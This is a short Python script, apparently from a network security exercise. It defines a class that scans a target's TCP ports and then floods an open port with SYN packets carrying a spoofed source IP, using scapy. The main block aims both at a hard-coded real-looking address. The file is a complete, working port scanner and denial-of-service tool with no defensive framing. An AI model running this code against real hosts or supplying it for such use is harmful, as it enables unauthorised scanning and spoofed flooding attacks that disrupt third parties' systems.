import sys, socket
import re
import os.path
from scapy.all import IP, TCP, send, RandShort
class TcpAttack():
    def __init__(self, spoofIP:str, targetIP:str):
        self.spoofIP = spoofIP
        self.targetIP = targetIP
        #Note: The IP addresses can be expressed as symbolic hostnames or in dot-decimal notation.

    def scanTarget(self, rangeStart:int, rangeEnd:int):
        print(f"Scanning {self.targetIP} from {rangeStart} to {rangeEnd}")
        # rangeStart: the first port in the range of ports to be scanned
        # rangeEnd: the last port in the range of ports to be scanned
        OUT = open("openports.txt", "w")
        for port in range(rangeStart, rangeEnd+1):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.05)
            try:
                sock.connect((self.targetIP, port))
                OUT.write(str(port) + '\n')
            except:
                print(f"Port {port} is closed")
                pass
        
    def attackTarget(self, port:int, numSyn:int) -> int:
        # port: integer designating the port that the attack will use

        # numSyn: integer of SYN packets to send to target IP address at the given port
        sckt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connection_true = 0
        try:
            sckt.connect((self.targetIP, port))
            connection_true = 1
        except:
            pass
        for i in range(numSyn):
            IP_header = IP(src=self.spoofIP, dst=self.targetIP)
            TCP_header = TCP(sport=RandShort(), dport=port, flags="S")
            packet = IP_header / TCP_header
            try:
                send(packet)
            except Exception as e:
                print(e)
                pass
        return connection_true
if __name__ == "__main__":
    # Construct an instance of the TcpAttack class and perform a scan and attack
    spoofIP = '10.10.10.10'
    targetIP = '128.46.144.123'

    rangeStart = 1000
    rangeEnd = 4000

    tcp = TcpAttack(spoofIP, targetIP)
    tcp.scanTarget(rangeStart, rangeEnd)

    port = 1716
    numSyn = 100
    if tcp.attackTarget(port, numSyn):
        print(f"Port {port} was open, and flooded with {numSyn} SYN packets")